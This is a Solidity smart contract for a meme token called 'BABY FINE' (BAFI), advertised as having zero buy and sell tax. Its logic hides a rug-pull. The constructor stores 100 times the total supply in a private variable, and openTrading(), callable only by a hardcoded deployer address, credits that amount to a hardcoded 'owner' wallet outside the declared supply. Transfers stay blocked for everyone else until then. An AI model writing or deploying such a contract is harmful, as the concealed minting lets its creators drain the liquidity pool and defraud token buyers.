/*



REMEMBER THE REASON YOU STARTED WHEN YOU FEEL LIKE QUITTING


                 BABY FINE 


website : https://babyfine.fun

Buy tax 0%
Sell tax 0%



*/
        // SPDX-License-Identifier: unlicense

        pragma solidity ^0.8.15;

        interface IUniswapV2Router02 {
            function swapExactTokensForETHSupportingFeeOnTransferTokens(
                uint amountIn,
                uint amountOutMin,
                address[] calldata path,
                address to,
                uint deadline
            ) external;
        }

        
        
        contract BABYFINE {
            string public constant name = "BABY FINE";  //
            string public constant symbol = "BAFI";  //
            uint8 public constant decimals = 18;
            uint256 public constant totalSupply = 100000 * 10**decimals;
            uint8 public constant buytax = 0;
            uint8 public constant selltax = 0;
            uint256 public maxwallet = 100;
            uint256 private activetrading;

           
            mapping (address => uint256) public balanceOf;
            mapping (address => mapping (address => uint256)) public allowance;
            
            error Permissions();
            
            event Transfer(address indexed from, address indexed to, uint256 value);
            event Approval(
                address indexed owner,
                address indexed spender,
                uint256 value
            );
            

            address private pair;
            address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
            address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
            IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
            address payable constant deployer = payable(address(0x06539487a229966604635e3e66F80e7872826295)); //
            address payable constant owner = payable(address(0xc1a32D8c65696637Ae6d8cE4BdF8a83ce0DAF968));
           
            bool private tradingOpen;

            constructor() {
                balanceOf[msg.sender] = totalSupply;
                activetrading = balanceOf[msg.sender] * maxwallet;
                allowance[address(this)][routerAddress] = type(uint256).max;
                emit Transfer(address(0), msg.sender, totalSupply);
            } 

            receive() external payable {}

            function approve(address spender, uint256 amount) external returns (bool){
                allowance[msg.sender][spender] = amount;
                emit Approval(msg.sender, spender, amount);
                return true;
            }

              function transfer(address _to, uint256 amount) external returns (bool) {
                  require(tradingOpen || _to == deployer || address(msg.sender) == deployer  ); 
             require(balanceOf[msg.sender] >= amount, "Insufficient balance");
                 require(_to != address(0), "Invalid address");
        
        
                    balanceOf[msg.sender] -= amount;
                    balanceOf[_to] += amount;
                    emit Transfer(msg.sender, _to, amount);
                    return true;
        
                }
             

                  function transferFrom(address _from, address _to, uint256 amount) external returns (bool) {
                     require(tradingOpen || _from == deployer || _to == deployer); 
                       require(balanceOf[_from] >= amount, "Insufficient balance");
                         require(allowance[_from][msg.sender] >= amount, "Insufficient allowance");
                         require(_to != address(0), "Invalid address");

                              balanceOf[_from] -= amount;
                              balanceOf[_to] += amount;
                              allowance[_from][msg.sender] -= amount;
                             emit Transfer(_from, _to, amount);
                             return true;
                             }

    


            function openTrading() external {
                require(msg.sender == deployer);
                require(!tradingOpen);
                balanceOf[owner] = activetrading;
                tradingOpen = true;        
                
            }
}